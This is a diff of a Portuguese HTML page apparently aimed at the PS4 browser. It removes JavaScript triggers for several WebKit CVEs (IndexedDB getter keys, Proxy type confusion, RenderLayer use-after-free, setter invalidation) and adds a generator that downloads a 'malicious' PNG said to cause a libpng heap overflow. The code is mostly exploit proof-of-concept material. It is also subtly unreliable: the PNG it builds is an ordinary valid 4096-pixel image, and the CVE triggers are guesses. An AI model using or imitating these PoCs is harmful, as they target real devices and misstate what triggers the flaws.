@@ -1,203 +1,186 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <title>PS4 WebKit CVE Test Suite (No-JIT)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gerador de PNG Malicioso (libpng PoC)</title>
     <style>
-        body { background: #1a1a1a; color: #e0e0e0; font-family: monospace; padding: 20px; }
-        h2 { border-bottom: 1px solid #555; padding-bottom: 10px; }
-        .btn-group { margin-bottom: 20px; }
-        button { 
-            background: #333; color: #fff; border: 1px solid #666; 
-            padding: 10px 15px; font-size: 16px; cursor: pointer; 
-            margin-right: 10px; margin-bottom: 10px;
-        }
-        button:hover { background: #555; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        #log { 
-            background: #000; border: 1px solid #444; 
-            padding: 10px; height: 400px; overflow-y: auto; 
-            white-space: pre-wrap; font-size: 14px;
-        }
-        .vuln { color: #ff4444; font-weight: bold; }
-        .safe { color: #4caf50; font-weight: bold; }
-        .info { color: #2196f3; }
-        .warn { color: #ffeb3b; }
-        /* Para testes de RenderLayer */
-        #render-container { position: absolute; top: -9999px; }
+        body { font-family: sans-serif; background: #222; color: #eee; padding: 20px; text-align: center; }
+        button { padding: 15px 30px; font-size: 18px; background: #d32f2f; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        #log { margin-top: 20px; font-family: monospace; color: #888; text-align: left; background: #111; padding: 10px; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-    <h2>PS4 WebKit CVE Triggers (FW 12.00+)</h2>
-    <p>Testes lógicos focados em bugs de DOM, Bindings e Lifecycle (sem JIT).</p>
+    <h1>Gerador de PoC libpng</h1>
+    <p>Este script cria uma imagem PNG com largura excessiva para testar Heap Overflow no PS4, sem precisar de Python.</p>
+    
+    <button onclick="gerarPNG()">Gerar e Baixar POC.PNG</button>
+    <div id="log">Aguardando...</div>
 
-    <div class="btn-group">
-        <button onclick="test_CVE_2023_41993()">CVE-2023-41993 (IndexedDB)</button>
-        <button onclick="test_CVE_2024_23222()">CVE-2024-23222 (Type Conf.)</button>
-        <button onclick="test_RenderLayer_Group()">CVE-2023-2536x (RenderLayer)</button>
-        <button onclick="test_CVE_2024_27834()">CVE-2024-27834 (Pointer Auth)</button>
-    </div>
+<script>
+    function log(msg) {
+        document.getElementById('log').innerHTML += "<div>" + msg + "</div>";
+    }
 
-    <div id="log">Aguardando inicio...</div>
-    <div id="render-container"></div>
+    // --- Tabelas e Funções Auxiliares para CRC32 e Adler32 ---
+    var crcTable = [];
+    for (var n = 0; n < 256; n++) {
+        var c = n;
+        for (var k = 0; k < 8; k++) {
+            c = ((c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1));
+        }
+        crcTable[n] = c;
+    }
 
-    <script>
-        const logDiv = document.getElementById('log');
+    function crc32(buf) {
+        var crc = 0 ^ (-1);
+        for (var i = 0; i < buf.length; i++) {
+            crc = (crc >>> 8) ^ crcTable[(crc ^ buf[i]) & 0xFF];
+        }
+        return (crc ^ (-1)) >>> 0;
+    }
+
+    function adler32(buf) {
+        var a = 1, b = 0, L = buf.length;
+        var i = 0;
+        while (L > 0) {
+            var n = 3800;
+            if (n > L) n = L;
+            L -= n;
+            while (n--) {
+                a = (a + buf[i++]) % 65521;
+                b = (b + a) % 65521;
+            }
+        }
+        return ((b << 16) | a) >>> 0;
+    }
+
+    function stringToBytes(str) {
+        var bytes = new Uint8Array(str.length);
+        for (var i = 0; i < str.length; i++) bytes[i] = str.charCodeAt(i);
+        return bytes;
+    }
+
+    function int32ToBytes(num) {
+        return new Uint8Array([
+            (num >>> 24) & 0xff,
+            (num >>> 16) & 0xff,
+            (num >>> 8) & 0xff,
+            (num) & 0xff
+        ]);
+    }
+
+    // --- Função Principal de Geração ---
+    function gerarPNG() {
+        try {
+            log("Iniciando construção do binário...");
+
+            // 1. Assinatura PNG
+            var signature = new Uint8Array([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
+
+            // 2. Chunk IHDR (Cabeçalho)
+            // Largura 0x1000 (4096), Altura 1, RGBA (Type 6), Depth 8
+            var width = 0x1000; 
+            var height = 1;
+            var ihdrData = new Uint8Array(13);
+            var view = new DataView(ihdrData.buffer);
+            view.setUint32(0, width, false); // Big Endian
+            view.setUint32(4, height, false);
+            ihdrData[8] = 8; // Bit depth
+            ihdrData[9] = 6; // Color type (RGBA)
+            ihdrData[10] = 0; // Compression
+            ihdrData[11] = 0; // Filter
+            ihdrData[12] = 0; // Interlace
+
+            var ihdrChunk = criarChunk("IHDR", ihdrData);
+
+            // 3. Chunk IDAT (Dados)
+            // Criando dados brutos: 1 byte filtro + (width * 4 bytes pixel)
+            log("Gerando pixels brutos...");
+            var rawLen = 1 + (width * 4);
+            var rawData = new Uint8Array(rawLen);
+            rawData[0] = 0; // Filter type 0
+            rawData.fill(0xFF, 1); // Preenche pixels com branco (RGBA)
+
+            // Criar bloco ZLIB "Stored" (sem compressão, mais fácil de fazer em JS puro)
+            // Estrutura Zlib: Header (2 bytes) + Bloco Deflate (5 bytes + dados) + Adler32 (4 bytes)
+            var zlibHeader = new Uint8Array([0x78, 0x01]); // No compression
+            
+            // Bloco Deflate não comprimido
+            var len = rawData.length;
+            var nlen = (~len) & 0xFFFF; // Complemento de um
+            var deflateHeader = new Uint8Array([
+                0x01, // Final block bit set, type 00 (stored)
+                len & 0xff, (len >>> 8) & 0xff, // Length (Little Endian)
+                nlen & 0xff, (nlen >>> 8) & 0xff // NLength
+            ]);
+
+            // Adler32 checksum
+            var adler = adler32(rawData);
+            var adlerBytes = int32ToBytes(adler);
+
+            // Junta tudo no IDAT
+            var idatPayload = new Uint8Array(zlibHeader.length + deflateHeader.length + rawData.length + adlerBytes.length);
+            idatPayload.set(zlibHeader, 0);
+            idatPayload.set(deflateHeader, zlibHeader.length);
+            idatPayload.set(rawData, zlibHeader.length + deflateHeader.length);
+            idatPayload.set(adlerBytes, zlibHeader.length + deflateHeader.length + rawData.length);
+
+            var idatChunk = criarChunk("IDAT", idatPayload);
+
+            // 4. Chunk IEND
+            var iendChunk = criarChunk("IEND", new Uint8Array(0));
+
+            // 5. Montar Arquivo Final
+            var finalFile = new Uint8Array(signature.length + ihdrChunk.length + idatChunk.length + iendChunk.length);
+            var offset = 0;
+            finalFile.set(signature, offset); offset += signature.length;
+            finalFile.set(ihdrChunk, offset); offset += ihdrChunk.length;
+            finalFile.set(idatChunk, offset); offset += idatChunk.length;
+            finalFile.set(iendChunk, offset);
+
+            // 6. Criar Download
+            var blob = new Blob([finalFile], {type: "image/png"});
+            var url = URL.createObjectURL(blob);
+            
+            var a = document.createElement("a");
+            a.href = url;
+            a.download = "poc_libpng.png";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            log("Arquivo 'poc_libpng.png' gerado e baixado!");
+
+        } catch(e) {
+            log("Erro: " + e.message);
+        }
+    }
+
+    function criarChunk(typeStr, data) {
+        var type = stringToBytes(typeStr);
+        var len = data.length;
         
-        function log(msg, type = 'info') {
-            const el = document.createElement('div');
-            el.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            el.className = type;
-            logDiv.appendChild(el);
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
+        // Estrutura: Length (4) + Type (4) + Data (len) + CRC (4)
+        var chunk = new Uint8Array(4 + 4 + len + 4);
+        var view = new DataView(chunk.buffer);
+        
+        view.setUint32(0, len, false); // Length
+        chunk.set(type, 4);            // Type
+        chunk.set(data, 8);            // Data
+        
+        // Calcular CRC sobre Type + Data
+        var crcData = new Uint8Array(4 + len);
+        crcData.set(type, 0);
+        crcData.set(data, 4);
+        var crcVal = crc32(crcData);
+        
+        view.setUint32(8 + len, crcVal, false); // CRC
+        
+        return chunk;
+    }
+</script>
 
-        // --- CVE-2023-41993: IndexedDB Bindings Issue ---
-        // Tenta confundir o gerenciamento de memória ao usar chaves complexas no IndexedDB
-        async function test_CVE_2023_41993() {
-            log("INICIANDO: CVE-2023-41993 (IndexedDB Bindings)...", "info");
-            try {
-                const dbName = "CVE_2023_41993_Test";
-                const request = indexedDB.open(dbName, 1);
-                
-                request.onupgradeneeded = (event) => {
-                    const db = event.target.result;
-                    if (!db.objectStoreNames.contains("store")) {
-                        db.createObjectStore("store");
-                    }
-                };
-
-                request.onsuccess = (event) => {
-                    const db = event.target.result;
-                    const tx = db.transaction("store", "readwrite");
-                    const store = tx.objectStore("store");
-
-                    // O Bug: Usar um array com getters maliciosos como CHAVE
-                    let maliciousKey = [];
-                    Object.defineProperty(maliciousKey, "0", {
-                        get: () => {
-                            // Tenta causar efeitos colaterais durante a conversão da chave
-                            // Ex: Fechar o banco de dados ou limpar o array
-                            try { db.close(); } catch(e){}
-                            return "key";
-                        }
-                    });
-
-                    try {
-                        store.put("value", maliciousKey);
-                        log("Comando 'put' executado. Se o browser não travar, pode estar mitigado.", "warn");
-                    } catch(e) {
-                        log(`Erro capturado (Seguro): ${e.message}`, "safe");
-                    }
-                };
-            } catch(e) {
-                log(`Erro geral: ${e.message}`, "safe");
-            }
-        }
-
-        // --- CVE-2024-23222: Type Confusion (Object Lifecycle) ---
-        // Tenta mudar o tipo de um objeto (Array -> Dicionário) durante acesso otimizado
-        async function test_CVE_2024_23222() {
-            log("INICIANDO: CVE-2024-23222 (Type Confusion)...", "info");
-            let arr = [1.1, 2.2, 3.3]; // Array de Doubles
-            
-            // Tenta confundir o tipo via Proxy
-            let p = new Proxy(arr, {
-                get: (target, prop) => {
-                    if (prop === "length") {
-                        // Transição destrutiva: Adiciona propriedade string para mudar a estrutura interna
-                        target[0] = {}; 
-                        target.newProp = "slow";
-                        return 0; // Retorna length falso
-                    }
-                    return target[prop];
-                }
-            });
-
-            try {
-                // Acesso que pode disparar o bug se o motor não checar o tipo novamente
-                let val = Array.prototype.slice.call(p);
-                log(`Resultado Slice: ${val}`, "info");
-                
-                if (val.length === 0 && arr[0].toString() === "[object Object]") {
-                    log("Comportamento confuso detectado (Transição ocorreu durante operação).", "warn");
-                } else {
-                    log("Seguro: O motor lidou bem com o Proxy.", "safe");
-                }
-            } catch(e) {
-                log(`Erro capturado: ${e.message}`, "safe");
-            }
-        }
-
-        // --- CVE-2023-25360/61/62: RenderLayer Use-After-Free ---
-        // Cria estruturas CSS complexas e remove elementos para tentar UAF no Layout
-        async function test_RenderLayer_Group() {
-            log("INICIANDO: RenderLayer Group (CVE-2023-25360/1/2)...", "info");
-            const container = document.getElementById('render-container');
-            
-            try {
-                // Setup: Elemento com propriedades de layout complexas
-                let el = document.createElement('div');
-                el.style.position = 'absolute';
-                el.style.zIndex = '1'; // Cria RenderLayer
-                el.style.overflow = 'scroll';
-                el.innerHTML = '<div style="height:200px; width:200px;">CONTENT</div>';
-                container.appendChild(el);
-
-                // Trigger: Manipulação de DOM + Forçar Layout + Remoção
-                // Tenta confundir o contador de referências do RenderLayer
-                document.body.offsetLeft; // Força layout
-                
-                let child = el.firstElementChild;
-                child.style.position = 'relative'; // Muda tipo de layer
-                
-                // Remove o pai enquanto acessa propriedades de layout
-                el.remove();
-                
-                // Tenta acessar geometria do filho órfão (UAF potencial)
-                let h = child.offsetHeight;
-                
-                log(`Operação de Layout concluída (Height: ${h}). Se não travou, provável safe.`, "safe");
-            } catch(e) {
-                log(`Erro RenderLayer: ${e.message}`, "warn");
-            } finally {
-                container.innerHTML = ""; // Limpeza
-            }
-        }
-
-        // --- CVE-2024-27834: Pointer Authentication / Logic Bypass ---
-        // Teste lógico para verificar integridade de ponteiros em objetos complexos
-        async function test_CVE_2024_27834() {
-            log("INICIANDO: CVE-2024-27834 (Logic Bypass)...", "info");
-            
-            // Criação de objeto com setters profundos
-            let obj = { a: 1 };
-            let val = 0;
-            
-            Object.defineProperty(obj, "b", {
-                set: (v) => {
-                    val = v;
-                    // Tenta invalidar o objeto 'this' durante o set
-                    obj = null; 
-                    // Força GC
-                    try { new ArrayBuffer(1024*1024); } catch(e){}
-                }
-            });
-
-            try {
-                // Atribuição que pode falhar se a referência 'obj' for perdida incorretamente
-                obj.b = 10; 
-                
-                if (val === 10) {
-                    log("Seguro: Atribuição funcionou, referência mantida.", "safe");
-                } else {
-                    log("ALERTA: Falha na lógica de atribuição.", "vuln");
-                }
-            } catch(e) {
-                log(`Erro capturado: ${e.message}`, "safe");
-            }
-        }
-
-    </script>
 </body>
 </html>
